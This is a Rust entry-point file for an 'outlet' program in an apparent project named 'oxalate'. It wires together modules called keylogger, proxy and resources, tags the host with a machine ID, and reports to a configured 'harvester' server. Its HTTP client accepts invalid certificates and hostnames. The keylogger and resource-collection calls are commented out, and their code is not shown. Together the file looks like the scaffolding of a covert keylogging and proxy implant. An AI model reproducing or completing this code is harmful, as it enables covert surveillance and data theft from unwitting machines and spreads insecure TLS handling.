use std::{
    future::pending,
    sync::{Arc, atomic::AtomicU64},
    time::Duration,
};

use envconfig::Envconfig;
use log::info;
use machine_uid::machine_id::get_machine_id;
use oxalate_env::load_env_vars;
use oxalate_init::{init_kafka_producer, init_logger};
use rand::RngExt;
use rand::distr::Alphanumeric;
use reqwest::{
    Client,
    header::{HeaderMap, HeaderValue},
};

mod uptime_pinger;
pub use uptime_pinger::uptime_pinger;

mod keylogger;
pub use keylogger::keylogger;

mod proxy;
pub use proxy::proxy;

mod resources;
pub use resources::resources;

#[derive(Envconfig)]
pub struct EnvVars {
    #[envconfig(from = "RUST_LOG", default = "info")]
    pub rust_log: String,

    #[envconfig(from = "PUBLIC_HARVESTER_PORT", default = "6767")]
    pub public_harvester_port: u16,

    #[envconfig(from = "HARVESTER_DNS")]
    pub harvester_dns: String,

    // kafka
    #[envconfig(from = "KAFKA_PORT", default = "19092")]
    pub kafka_port: u16,

    #[envconfig(from = "KAFKA_DNS")] // , default = "oxalate_redpanda"
    pub kafka_dns: Option<String>, // depending if this is none you can disable kafka logging

    #[envconfig(from = "KAFKA_MESSAGE_TIMEOUT_MS", default = "5000")]
    pub kafka_message_timeout_ms: u64,

    #[envconfig(from = "KAFKA_OUTLET_LOGS_TOPIC", default = "harvester_logs")]
    pub kafka_outlet_logs_topic: String,

    // Postgres
    #[envconfig(from = "POSTGRES_USER")]
    pub postgres_user: String,
    #[envconfig(from = "POSTGRES_PASSWORD")]
    pub postgres_password: String,
    #[envconfig(from = "POSTGRES_DB")]
    pub postgres_db: String,

    #[envconfig(from = "DB_DNS", default = "oxalate-paradedb")]
    pub db_dns: String,
    #[envconfig(from = "DB_PORT", default = "6666")]
    pub db_port: u16,
    #[envconfig(from = "POOL_MAX_CONN", default = "25")]
    pub pool_max_conn: u32,
}

#[derive(Clone)]
pub struct AppState {
    request_counter: Arc<AtomicU64>,
    machine_id: &'static str,
    env_vars: &'static EnvVars,
}

#[tokio::main]
async fn main() {
    let env_vars: &'static EnvVars = load_env_vars();

    let machine_id = {
        let machine_id = get_machine_id().unwrap_or("unknown".into());
        let runtime_rng: String = rand::rng()
            .sample_iter(&Alphanumeric)
            .take(32)
            .map(char::from)
            .collect();
        Box::new(format!("{machine_id}@{runtime_rng}")).leak() as &'static str
    };

    let producer = match env_vars.kafka_dns.as_ref() {
        Some(dns) => {
            let p =
                init_kafka_producer(dns, env_vars.kafka_port, env_vars.kafka_message_timeout_ms)
                    .await
                    .expect("failed to init kafka producer");
            Some(p)
        }
        None => None,
    };

    init_logger(
        env_vars.kafka_outlet_logs_topic.to_owned(),
        producer.to_owned(),
    )
    .await;

    info!("outlet inited with machine id: {:?}", machine_id);

    let global_state = AppState {
        request_counter: Arc::new(0.into()),
        machine_id,
        env_vars,
    };

    let mut headers = HeaderMap::new();
    headers.insert("machine-id", HeaderValue::from_str(machine_id).unwrap());
    let reqwest_client = Client::builder()
        .default_headers(headers)
        .danger_accept_invalid_hostnames(true)
        .danger_accept_invalid_certs(true)
        .pool_max_idle_per_host(32)
        .connect_timeout(Duration::from_secs(5))
        .timeout(Duration::from_secs(90))
        .pool_idle_timeout(Duration::from_secs(5))
        .build()
        .unwrap();

    uptime_pinger(global_state.to_owned());
    // keylogger(reqwest_client.to_owned());
    proxy(reqwest_client.to_owned(), global_state.to_owned());
    // resources(reqwest_client.to_owned(), global_state.to_owned());

    info!("successfully inited, running forever!");
    pending::<()>().await;
}
